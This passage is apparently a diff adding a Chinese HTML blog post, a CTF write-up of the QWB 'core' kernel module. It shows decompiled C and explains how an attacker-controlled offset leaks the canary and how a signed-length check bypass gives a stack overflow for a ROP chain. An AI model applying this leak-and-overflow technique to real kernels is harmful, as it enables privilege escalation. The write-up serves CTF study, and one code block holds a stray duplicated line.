+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;core_ioctl()&lt;/strong&gt; 定义了三条命令，分别调用 &lt;strong&gt;core_read()&lt;/strong&gt;，&lt;strong&gt;core_copy_func()&lt;/strong&gt; 和设置全局变量 &lt;strong&gt;off&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__fastcall&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;core_ioctl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6677889B&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;core_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6677889C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: %d&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;off&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+      &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x6677889A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: called core_copy&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;core_copy_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+      &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+      &lt;span class=&#34;n&#34;&gt;core_copy_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;core_read()&lt;/strong&gt; 从 &lt;code&gt;v4[off]&lt;/code&gt; 拷贝 64 个字节到用户空间，但要注意的是全局变量 &lt;code&gt;off&lt;/code&gt; 使我们能够控制的，因此可以合理的控制 &lt;code&gt;off&lt;/code&gt; 来 leak canary 和一些地址&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__fastcall&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;core_read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// rbx
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// rdi
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// rcx
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+0h] [rbp-50h]
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+40h] [rbp-10h]
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;__readgsqword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: called core_read&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;%d %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_DWORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Welcome to the QWB CTF challenge.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;copy_to_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;off&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;kr&#34;&gt;__asm&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;swapgs&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;core_copy_func()&lt;/strong&gt; 从全局变量 &lt;code&gt;name&lt;/code&gt; 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 &lt;code&gt;unsigned __int16&lt;/code&gt;，但传递的长度是 &lt;code&gt;signed __int64&lt;/code&gt;，因此如果控制传入的长度为 &lt;code&gt;0xffffffffffff0000|(0x100)&lt;/code&gt; 等值，就可以栈溢出了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__fastcall&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;core_copy_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+0h] [rbp-50h]
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+40h] [rbp-10h]
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;__readgsqword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: called core_writen&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016D&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;etect Overflow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;qmemcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// overflow
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;core_write()&lt;/strong&gt; 向全局变量 &lt;code&gt;name&lt;/code&gt; 上写，这样通过 &lt;code&gt;core_write()&lt;/code&gt; 和 &lt;code&gt;core_copy_func()&lt;/code&gt; 就可以控制 ropchain 了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__fastcall&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;core_write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// rbx
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: called core_writen&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x800&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;copy_from_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: error copying data from userspacen&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
